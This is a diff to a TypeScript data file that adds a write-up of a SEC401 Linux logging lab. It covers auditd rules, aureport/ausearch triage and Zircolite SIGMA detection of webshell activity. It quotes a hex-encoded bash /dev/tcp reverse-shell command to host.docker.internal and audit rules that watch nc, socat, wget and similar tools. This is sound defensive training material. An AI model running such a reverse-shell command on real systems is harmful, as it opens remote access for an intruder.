@@ -1992,15 +1992,147 @@ export const LABS: CybersecurityLab[] = [
     slug: "linux-logging-auditing",
     title: "Lab 6.3 - Linux Logging and Auditing",
     course: "SEC401 - Containers, Linux and Mac Security",
+    role: "Solo, Lab",
     focus: "Linux Security",
     level: "SEC401",
-    context: "",
-    summary: "Linux logging, audit configuration, and log analysis.",
-    whyThisMatters: "",
-    tools: [],
-    steps: [],
-    outcome: "",
-    comingSoon: true,
+    date: "Apr 2026",
+    artifacts: "Sanitized terminal screenshots from auditd, aureport, ausearch, and Zircolite SIGMA detection",
+    context:
+      "This lab walks the full Linux audit pipeline: an auditd rules file that watches recon/suspicious binaries, aureport/ausearch for querying audit.log, decoding a hex-encoded bash reverse shell, and finally running Zircolite with a SIGMA ruleset to surface 177 Webshell Remote Command Execution events from the same audit log.",
+    summary:
+      "Reviewed a Best-Practice auditd rules file (recon + susp_activity + sssd watches), ran aureport --summary to see 28 failed logins / 41020 events / 17 keys, used ausearch -k with -i for interpreted fields, decoded a hex-payload reverse shell to host.docker.internal:3869, and used Zircolite with alpha_rules_linux.json to detect a critical Webshell RCE pattern (177 events).",
+    whyThisMatters:
+      "Linux log triage is the #2 most-reported CyberLive skill on GSEC. Knowing aureport/ausearch flags by reflex — especially -k for keyed watches and -i for interpreted output — is the difference between answering a Linux forensics question in 30 seconds vs. burning 5 minutes on syntax.",
+    tldr: [
+      "auditd rules file watches recon (whoami/id/uname), suspicious binaries (nc/nmap/tcpdump/wget), and sssd execve",
+      "aureport --summary + aureport --key --summary are the one-command triage views",
+      "ausearch -k <key> -i retrieves keyed events with UIDs and timestamps resolved",
+      "Zircolite with SIGMA rules found 177 Webshell RCE events in the same audit.log",
+    ],
+    skillsDemonstrated: [
+      "Linux auditd rule authoring (-w / -a / -k / -F)",
+      "aureport / ausearch log triage",
+      "Decoding hex-encoded attacker payloads",
+      "SIGMA ruleset execution with Zircolite",
+      "MITRE ATT&CK mapping via SIGMA tags",
+    ],
+    tools: ["auditd", "aureport", "ausearch", "Zircolite", "SIGMA", "xxd", "gedit"],
+    steps: [
+      "Open /etc/audit/audit.rules (Florian Roth Best-Practice template) in gedit",
+      "Review recon / susp_activity / sssd watch syntax",
+      "aureport --summary for high-level event counts",
+      "aureport --key --summary for keyed-rule breakdown",
+      "xxd -r -p to decode a hex-encoded reverse shell payload",
+      "ausearch --input audit.log -k sbin_susp",
+      "ausearch -i to resolve UIDs and timestamps in-place",
+      "zircolite --events audit.log --ruleset alpha_rules_linux.json --audit",
+      "Review detected_events.json for SIGMA hits",
+    ],
+    stepDetails: [
+      {
+        title: "Open the auditd rules file",
+        description:
+          "Opened /sec401/labs/6.3/audit.rules with gedit — Florian Roth's Best-Practice auditd rules file, based on gov.uk auditd, CentOS 7 hardening, and linux-audit.com tuning guides.",
+        command: "cd /sec401/labs/6.3\ngedit audit.rules &",
+        screenshot: "/labs/linux-logging-124638.png",
+      },
+      {
+        title: "Review recon / susp_activity / sssd rules",
+        description:
+          "Core audit patterns: -w <path> -p x -k <key> watches binaries for execution. Recon watches cover whoami, id, hostname, uname, /etc/issue. susp_activity covers wget, curl, base64, nc, netcat, ncat, ss, netstat, ssh, scp, sftp, ftp, socat, wireshark, tshark, rdesktop, xfreerdp, nmap. sssd block uses -a always,exit -F path=... -F perm=x -F auid>=500 to audit only real-user exec (auid>=500 excludes system accounts).",
+        command: "# syntax shown:\n-w /usr/bin/whoami -p x -k recon\n-w /usr/bin/nc -p x -k susp_activity\n-a always,exit -F path=/usr/libexec/sssd/p11_child -F perm=x -F auid>=500 -F auid!=4294967295 -k T1078_Valid_Accounts",
+        commandBreakdown: "-w: watch a path\n-p x: on execute (r/w/a/x for read/write/attr/exec)\n-k: key name (aureport/ausearch filter)\n-a always,exit: rule fires on syscall exit\n-F: field filter (perm, path, auid)\nauid!=4294967295: exclude unset audit UID",
+        screenshot: "/labs/linux-logging-124837.png",
+      },
+      {
+        title: "aureport --summary",
+        description:
+          "aureport --input ./audit.log --summary — high-level triage view of a captured audit log. 41020 events, 28 failed logins, 13 failed authentications, 72 commands, 50 executables, 83 files, 1544 failed syscalls, 17 keys, 21518 process IDs. Range Sep 28 2023 20:56 → Sep 29 14:23. This is the one-liner you run first to size the investigation.",
+        command: "aureport --input ./audit.log --summary",
+        commandBreakdown: "--input: read from a file instead of /var/log/audit/audit.log\n--summary: one-screen overview",
+        screenshot: "/labs/linux-logging-124927.png",
+      },
+      {
+        title: "aureport --key --summary",
+        description:
+          "Key-based breakdown of which audit rules fired most. network_socket_created 21638, detect_execve_www 14588, 'remote_shell' 3029, network_connect_4 880, susp_shell 162, etcpasswd 55, software_mgmt 37, network_connect_6 25, recon 24, session 21, systemd 16, Data_Compressed 8, specialfiles 7, susp_activity 4, string_search 2, anon_file_create 2, sbin_susp 1. This collapses 41k events into 17 focus areas.",
+        command: "aureport --input audit.log --key --summary",
+        screenshot: "/labs/linux-logging-125059.png",
+      },
+      {
+        title: "Decode a hex-encoded reverse shell",
+        description:
+          "One of the audit events contained a hex-encoded command. Piped the hex string through xxd -r -p to decode: /usr/bin/bash -c (echo </dev/tcp/host.docker.internal/3869) 2>/dev/null — a classic bash /dev/tcp reverse shell testing an open port. Decoding hex-obfuscated payloads is a standard CyberLive skill.",
+        command: "echo -n 2F7573722F62696E2F62617368002D6300286563686F203C2F6465762F7463702F686F73742E646F636B65722E696E7465726E616C2F333836392920323E2F6465762F6E756C6C2026 | xxd -r -p ; echo",
+        commandBreakdown: "xxd -r -p: reverse hex to bytes, plain format (no line numbers)\n-n on echo: no trailing newline",
+        screenshot: "/labs/linux-logging-125603.png",
+      },
+      {
+        title: "ausearch by key",
+        description:
+          "ausearch --input audit.log -k sbin_susp — pulls every event with key sbin_susp. Output is the raw audit format: PROCTITLE, PATH, EXECVE, SYSCALL. Shows uid=33 (www-data) invoking /usr/sbin/tcpdump — the web server user spawning a packet sniffer, which is the whole point of the sbin_susp key.",
+        command: "ausearch --input audit.log -k sbin_susp",
+        commandBreakdown: "-k: filter by key (same name you set in the -k rule field)",
+        screenshot: "/labs/linux-logging-125730.png",
+      },
+      {
+        title: "ausearch -i for interpreted output",
+        description:
+          "Same query with -i. Now UIDs render as usernames (www-data instead of 33), timestamps render as human-readable (09/28/2023 20:56:15.474 instead of the 1695934575.474 unix timestamp), and arch shows x86_64. -i is the one flag that makes ausearch output actually readable under exam time pressure.",
+        command: "ausearch --input audit.log -k sbin_susp -i",
+        commandBreakdown: "-i: interpret numeric fields (uid/gid → name, epoch → date, syscall numbers → names)",
+        screenshot: "/labs/linux-logging-125803.png",
+      },
+      {
+        title: "Zircolite: SIGMA over audit.log",
+        description:
+          "zircolite --events audit.log --ruleset rules/alpha_rules_linux.json --audit — runs 169 SIGMA detection rules against the audit log. Finished in 13 seconds. Two hits: Webshell Remote Command Execution [critical] → 177 events, System Information Discovery - Auditd [low] → 11 events. Zircolite is the 'one command turns raw audit.log into SIEM-style alerts' tool.",
+        command: "zircolite --events audit.log --ruleset rules/alpha_rules_linux.json --audit",
+        commandBreakdown: "--events: input log (audit.log, evtx, sysmon)\n--ruleset: compiled SIGMA JSON\n--audit: tells Zircolite this is Linux auditd format",
+        screenshot: "/labs/linux-logging-125927.png",
+      },
+      {
+        title: "Review detected_events.json",
+        description:
+          "Zircolite wrote detected_events.json: title 'Webshell Remote Command Execution', id c0d3734d-330f-4a03-aae2-65dacc6a8222, rule_level critical, tags attack.persistence + attack.t1505.003, count 177. The underlying SIGMA query was SELECT * FROM logs WHERE type='SYSCALL' AND syscall='59' AND exe='/usr/bin/dash' — execve of dash by the web server, which is the webshell signature.",
+        command: "gedit detected_events.json &",
+        screenshot: "/labs/linux-logging-130206.png",
+      },
+    ],
+    outcome:
+      "Demonstrated the full Linux detection pipeline from auditd rules → aureport/ausearch triage → hex-payload decode → SIGMA detection with Zircolite. End state: 41k events narrowed to 177 Webshell RCE alerts with MITRE ATT&CK T1505.003 mapping, all from standard Linux tooling.",
+    nextStepsInProduction:
+      "Ship audit.log into the SIEM (Splunk, Elastic) with key-based field extraction so analysts can pivot by recon / susp_activity / remote_shell without running ausearch on every host. Deploy Zircolite as a cron to produce detected_events.json per-host and forward the critical-rule hits into the ticketing system. Expand the rules file with MITRE-mapped keys (T1059, T1071, T1087) so every audit rule carries its own ATT&CK tag.",
+    securityControlsRelevant: [
+      "auditd with Best-Practice rules (Florian Roth template)",
+      "aureport / ausearch for incident triage",
+      "SIGMA rulesets + Zircolite for log → detection pipeline",
+      "MITRE ATT&CK tagging on audit rule keys",
+      "auid>=500 filter to exclude system-account noise",
+    ],
+    keyFindings: [
+      "41020 audit events across Sep 28-29 2023 window",
+      "28 failed logins + 13 failed authentications in the same window",
+      "sbin_susp key: www-data (uid=33) spawning /usr/sbin/tcpdump",
+      "Hex-decoded payload: bash /dev/tcp reverse shell to host.docker.internal:3869",
+      "Zircolite SIGMA: 177 Webshell Remote Command Execution events (T1505.003 critical)",
+    ],
+    takeaway: [
+      "The -k flag is the whole game with auditd. Without keys every rule blurs into one undifferentiated stream; with keys you get a tagged index (aureport --key --summary) that lets you pivot by attacker behavior instead of by syscall. Any production audit rule without a meaningful -k value is a rule that won't get queried.",
+      "ausearch -i is the flag people forget under time pressure. Numeric UIDs and epoch timestamps are unreadable in a 5-minute CyberLive window. Train the muscle memory: ausearch -k <key> -i, always.",
+      "Zircolite over audit.log is the shape of modern Linux detection. You keep auditd's low-level coverage but bolt on SIGMA's community detection library and MITRE mapping. That's the difference between 'I have logs' and 'I have alerts' — and it's the answer to the inevitable audit finding that ships every SEC401 graduate into blue-team work.",
+    ],
+    screenshots: [
+      { src: "/labs/linux-logging-124638.png", alt: "Open audit.rules", caption: "gedit audit.rules & — Best-Practice template" },
+      { src: "/labs/linux-logging-124837.png", alt: "audit.rules content", caption: "recon + susp_activity + sssd watch rules" },
+      { src: "/labs/linux-logging-124927.png", alt: "aureport --summary", caption: "41020 events, 28 failed logins, 17 keys" },
+      { src: "/labs/linux-logging-125059.png", alt: "aureport --key --summary", caption: "Top keys: network_socket_created 21638, detect_execve_www 14588" },
+      { src: "/labs/linux-logging-125603.png", alt: "xxd hex decode", caption: "Hex → bash /dev/tcp reverse shell to :3869" },
+      { src: "/labs/linux-logging-125730.png", alt: "ausearch -k sbin_susp", caption: "www-data spawning /usr/sbin/tcpdump" },
+      { src: "/labs/linux-logging-125803.png", alt: "ausearch -i interpreted", caption: "UIDs → names, epoch → human timestamps" },
+      { src: "/labs/linux-logging-125927.png", alt: "Zircolite SIGMA run", caption: "169 rules → Webshell RCE critical (177 events)" },
+      { src: "/labs/linux-logging-130206.png", alt: "detected_events.json", caption: "T1505.003, syscall=59, exe=/usr/bin/dash" },
+    ],
   },
 ];
 
